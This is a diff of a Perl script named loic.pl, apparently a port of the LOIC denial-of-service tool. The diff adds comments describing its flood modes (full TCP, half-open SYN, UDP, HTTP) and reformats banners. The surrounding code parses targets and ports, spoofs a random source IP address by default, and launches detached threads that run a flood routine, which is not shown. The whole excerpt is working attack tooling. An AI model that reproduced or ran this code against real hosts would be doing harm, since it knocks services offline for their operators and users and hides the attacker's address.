@@ -24,11 +24,21 @@ use Config;
 use threads;
 
 my %in = ();
-GetOptions(\%in, 'path=s', 'tcp!', 'syn!', 'udp!', 'http!', 'help|h', 'threads:0', 'source=s', 'dport:80');
+GetOptions(\%in,
+	   'path=s',
+	   'tcp!',      # use full TCP connection
+	   'syn!',      # use half-open TCP connection
+	   'udp!',      # use UDP packets
+	   'http!',     # use HTTP packets
+	   'help|h',    # print help/usage
+	   'threads:0', # number of extra threads (default 0)
+	   'source=s',  # source ip address
+	   'dport:80'   # destination port (default 80)
+);
 
-##########################################
+############################################
 ## Check for incompatible/missing switches
-##########################################
+############################################
 die "Usage: loic.pl [--{tcp|syn|udp|http}] [--path X] [--threads X] [--dport X] [--source <ip>] <target>\n"
     if($in{help} || $in{h});
 
@@ -42,18 +52,18 @@ if(!(defined $Config{useithreads}) && $in{threads}) {
 die "error: source spoofing only works with SYN mode and UDP mode\n" 
     if $in{source} && ($in{http} || $in{tcp});
 
-##########################################
+############################################
 ## Set default settings
-##########################################
+############################################
 $in{source} = $in{source} || join('.', map int rand 256, 1..4);
 $in{threads} = $in{threads} || 0;
 $in{tcp} = 1 unless($in{udp} || $in{http} || $in{syn});
 $in{dport} = $in{dport} || 80;
 $in{path} = $in{path} || '/';
 
-##########################################
+############################################
 ## Create Threads
-##########################################
+############################################
 foreach(1..$in{threads}) {
     threads->create(\&flood)->detach();
 }
